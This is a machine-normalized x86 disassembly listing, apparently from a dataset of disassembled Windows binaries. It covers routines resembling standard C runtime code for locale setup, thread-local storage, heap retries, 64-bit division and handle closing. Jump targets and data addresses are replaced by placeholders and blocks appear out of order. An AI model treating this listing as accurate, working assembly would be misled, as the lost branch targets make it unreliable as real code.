cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_1000ccc5
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_1000cd58
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_1000a740
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_1000ccc5
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_1000d1f1
push 0x14
push r--data
call sub_1000bc40
or [ ebp - 0x20 ] 0xffffffff
call sub_1000d892
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_1000cee8
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_1000cf8c
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_1000dbc4
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_1000bc85
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_1000d008
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_1000a3c4
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_10009181
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_10009181
pop ecx
push 0xd
call sub_1000cc92
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000d352
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_10009181
pop ecx
sub_1000d3a9
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_1000d438
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_1000d4d1
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_10009181
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_10009181
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_10009181
push [ esi + 0xc0 ]
call sub_10009181
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_1000fea4
push [ esi + 0xd4 ]
call sub_10009181
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_10009181
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_10009181
pop ecx
push [ esi + 0xb0 ]
call sub_10009181
push [ esi + 0xbc ]
call sub_10009181
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_10009181
push [ esi + 0xbc ]
call sub_10010284
pop ecx
pop ecx
push eax
call sub_10009181
pop ecx
push eax
call sub_10009181
push [ esi + 0xbc ]
call sub_1001021b
pop ecx
pop ecx
sub_1000d61c
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_1000d3a9
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_1000d438
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_1000d4d1
pop ecx
sub_1000d669
push 0xc
push r--data
call sub_1000bc40
call sub_1000d892
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_1000cc92
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_1000d61c
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000d6d6
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_1000d892
mov esi [ eax + 0x6c ]
mov eax esi
call sub_1000bc85
retn
push 0x20
call sub_1000c22a
sub_1000d6f4
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_1000d728
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp sub_1000cb62
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_1000d765
push 0x8
push r--data
call sub_1000bc40
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_1000cc92
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000d807
push 0xc
call sub_1000cc92
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_1000d3a9
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000d810
call sub_1000bc85
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_1000d819
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_1000d6f4
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_1000dc09
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_10009181
pop ecx
xor esi esi
push 0x0
push esi
call sub_1000d765
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_1000d8ac
push 0x8
push r--data
call sub_1000bc40
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_1000bc85
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_10009181
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_10009181
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_10009181
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_10009181
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_10009181
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_10009181
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_10009181
pop ecx
push 0xd
call sub_1000cc92
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_10009181
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000d9c6
push 0xc
call sub_1000cc92
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000d9d2
push esi
call sub_10009181
pop ecx
push edi
call sub_1000d438
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_10009181
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_1000d4d1
pop ecx
sub_1000d9db
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
push [ ebp + 0x8 ]
call sub_1000d8ac
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_1000da49
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_1000d728
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_1000d6eb
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_1000bfd7
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_1000cb18
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_1000d728
mov edi [ DecodePointer@IAT ]
push sub_1000d8ac
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_1000dc09
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_1000d765
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_1000dbc4
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_10009388
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_1000dc09
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000a43f
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_1000dc55
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10010382
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_1000dca3
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_100095af
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1000dd20
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_1000ddd0
push ebx
push edi
xor edi edi
mov eax [ esp + 0x10 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x18 ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0xc ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] edx
or eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edx
mov ebx eax
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov eax [ esp + 0xc ]
div ecx
mov eax edx
xor edx edx
dec edi
jns r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov ecx eax
mul [ esp + 0x18 ]
xchg ecx eax
mul [ esp + 0x14 ]
add edx ecx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
jmp r-xdata
sub eax [ esp + 0x14 ]
sbb edx [ esp + 0x18 ]
cmp edx [ esp + 0x10 ]
ja r-xdata
pop edi
pop ebx
retn 0x10
jb r-xdata
sub eax [ esp + 0xc ]
sbb edx [ esp + 0x10 ]
dec edi
jns r-xdata
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_1000de82
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_1000fa21
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_1000a3ea
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_1000fa21
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_1000fa21
push 0x1
mov edi eax
call sub_1000fa21
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_1000f99b
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_1000df1e
push 0x10
push r--data
call sub_1000bc40
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_1000a3d7
and [ eax ] 0x0
call sub_1000a3c4
mov [ eax ] 0x9
call sub_1000a3d7
and [ eax ] 0x0
call sub_1000a3c4
mov [ eax ] 0x9
call sub_1000acab
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_1000bc85
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_1000fa8a
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1000a3c4
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_1000de82
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000dfda
mov eax [ ebp - 0x1c ]
sub_1000dfe2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_10009181
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_1000e020
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_1000e088
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1000d819
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_1000e1d2
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_1000e088
pop ecx
pop ecx
pop ebp
retn
sub_1000e1f2
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_1000a3c4
mov [ eax ] 0x16
call sub_1000acab
or eax 0xffffffff
pop ebp
retn
sub_1000e2ba
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_1000dc09
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
